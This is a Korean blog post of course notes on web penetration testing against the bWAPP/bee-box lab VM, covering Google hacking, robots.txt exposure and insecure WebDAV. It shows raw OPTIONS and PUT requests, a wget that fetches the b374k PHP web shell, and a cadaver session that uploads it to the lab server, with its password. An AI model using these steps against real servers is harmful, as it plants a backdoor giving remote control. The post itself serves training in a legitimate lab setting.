---
layout: post
title: "비박스를 활용한 웹 모의해킹 완벽 실습 - 보안 설정 오류(구글 해킹, Robots.txt, WebDav)"
excerpt_separator:  <!--more-->
categories:
 - WebHack
tags:
  - 웹 해킹
  - 인프런
  - Part5 A5
  - 보안 설정 오류
---

<!--more-->

# 출처

## 인프런, 비박스를 활용한 웹 모의해킹 완벽 실습 17강 <https://www.inflearn.com/course/%EB%B9%84%EB%B0%95%EC%8A%A4-%EB%AA%A8%EC%9D%98%ED%95%B4%ED%82%B9-%EC%8B%A4%EC%8A%B5/>

---

## 보안 설정 오류

### Exploit-DB GHDB

* 구글 검색으로 취약점을 찾을 수 있는 데이터베이스
* [Google Hacking Database](https://www.exploit-db.com/google-hacking-database/)
* Robots.txt: 구글 검색을 위한 파일이며 구글의 검색 허용 범위를 지정
* 관리자 페이지처럼 중요한 정보를 노출시킬 수도 있음

## Robots 파일 내 중요한 정보 노출

* 웹사이트 운영 시 원하지 않는 중요한 컨텐츠가 구글 등 각종 검색엔진에 의해 노출
* 검색엔진 로봇이 사이트에 접근하는 것을 제한하거나 허용하기 위해 웹사이트의 최상위 디렉토리에 특정한 설정 파일을 만듦
* 어떠한 컨텐츠에 대해서도 각종 봇의 접근이나 색인(index) 거부

|형식|설명|
|:----:|:----:|
|User-agent|검색 로봇을 설정하는 항목으로 *는 모든 로봇을 의미|
|Allow:/폴더명/|해당 폴더에 대한 접근을 허용|
|Disallow:/폴더명/|해당 폴더에 대한 접근을 거부|

---

## Robots File

![image](https://user-images.githubusercontent.com/28076542/52756444-b4c17f00-3044-11e9-954b-97bf7a25f648.png)

* URL: `192.168.190.143/bWAPP/robots.txt`에 들어가면 robots.txt 내용 확인 가능

### 192.168.190.143/bWAPP/robots.txt

```bash
User-agent: GoodBot
Disallow:

User-agent: BadBot
Disallow: /

User-agent: *
Disallow: /admin/
Disallow: /documents/
Disallow: /images/
Disallow: /passwords/
```

* URL 뒤에 각 항목을 넣어 들어가보면 민감한 자료가 존재

---

## Insecure WebDAV Configuration

![image](https://user-images.githubusercontent.com/28076542/52758880-4fbe5700-304d-11e9-9b38-6ed3e8b6b9e9.png)

* 이런게 있는데 어차피 요즘은 잘 안 쓴다고 함
* `put` 메소드가 제일 위험 --> 업로드 취약점

### URL로 접속한 WebDAV 창 확인

![image](https://user-images.githubusercontent.com/28076542/52759363-ed665600-304e-11e9-8885-15c4eff3af11.png)

### Bee-Box에서 /etc/apache2/httpd.conf

```bash
ExtendedStatus On
<Location /server-status>
 SetHandler server-status
 Order deny,allow
 Allow from all
</Location>

# Allows WebDAV, not secure!!!
Alias /webdav /var/www/bWAPP/documents
<Location /webdav>
 DAV On
</Location>
```

* 주석에서도 안전하지 않다고 써 있음

### WebDAV 동작 확인 방법

* 해당 사이트에 접속 후 BurpSuite 실행
* OPTIONS를 넣고 기타 항목은 지우기
* HTTP history에서 Response 확인

### BurpSuite Raw에 넣은 메시지

```bash
OPTIONS /webdav/ HTTP/1.1
Host: 192.168.190.143
```

### BurpSuite로 WebDAV 동작확인

![image](https://user-images.githubusercontent.com/28076542/52759410-1686e680-304f-11e9-84d0-86b5a4585104.png)

![image](https://user-images.githubusercontent.com/28076542/52759693-27842780-3050-11e9-8fce-56948af4d80b.png)

* **Allow** 항목에 옵션들이 나타남

### BurpSuite에 PUT 메시지 삽입

```bash
PUT /webdav/test.txt HTTP/1.1

Host: 192.168.190.143

User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate

Cookie: security_level=0; PHPSESSID=a44428958e332ff8c9355498af8ef26c

Connection: close

Upgrade-Insecure-Requests: 1



test1234
```

### WebDAV PUT 메시지 결과

![image](https://user-images.githubusercontent.com/28076542/52759807-9d888e80-3050-11e9-8d67-8f7feb77e7dc.png)

![image](https://user-images.githubusercontent.com/28076542/52760002-4800b180-3051-11e9-914d-4a9a0a0654cb.png)

---

## b374k

* PHP 환경에서 사용할 수 있는 웹쉘
* 웹쉘: 웹에서 사용할 수 있는 쉘 ㅎㅎ
* [b374k](https://github.com/tennc/webshell/tree/master/php/b374k)
* b374k-3.2.2.php를 사용할 것

### 칼리리눅스 터미널에 b374k 설치

```bash
root@ming:~# cd ~
root@ming:~# wget https://raw.githubusercontent.com/tennc/webshell/master/php/b374k/b374k-3.2.2.php
--2019-02-14 12:17:45--  https://raw.githubusercontent.com/tennc/webshell/master/php/b374k/b374k-3.2.2.php
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 151.101.72.133
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|151.101.72.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 84267 (82K) [text/plain]
Saving to: ‘b374k-3.2.2.php’

b374k-3.2.2.php       100%[=========================>]  82.29K  --.-KB/s    in 0.08s   

2019-02-14 12:17:45 (1.04 MB/s) - ‘b374k-3.2.2.php’ saved [222039]
```

### cadaver 실행

* cadaver: 칼리리눅스에서 기본으로 지원하는 툴로 여러가지 http 메소드를 사용할 수 있게 제공

```bash
root@ming:~# cadaver http://192.168.190.143/webdav/
dav:/webdav/> help
Available commands: 
 ls         cd         pwd        put        get        mget       mput       
 edit       less       mkcol      cat        delete     rmcol      copy       
 move       lock       unlock     discover   steal      showlocks  version    
 checkin    checkout   uncheckout history    label      propnames  chexec     
 propget    propdel    propset    search     set        open       close      
 echo       quit       unset      lcd        lls        lpwd       logout     
 help       describe   about      
Aliases: rm=delete, mkdir=mkcol, mv=move, cp=copy, more=less, quit=exit=bye
dav:/webdav/> put b374k-3.2.2.php 
Uploading b374k-3.2.2.php to `/webdav/b374k-3.2.2.php':
Progress: [=============================>] 100.0% of 222039 bytes succeeded.
dav:/webdav/> 
```

### WebDAV에 업로드 된 b374k

![image](https://user-images.githubusercontent.com/28076542/52760450-ee00eb80-3052-11e9-9478-fc07de796542.png)

* b374k-3.2.2.php를 클릭하고 비밀번호는 **b374k**

### b374k 실행 화면

![image](https://user-images.githubusercontent.com/28076542/52760511-1d175d00-3053-11e9-9078-f59fb8908b30.png)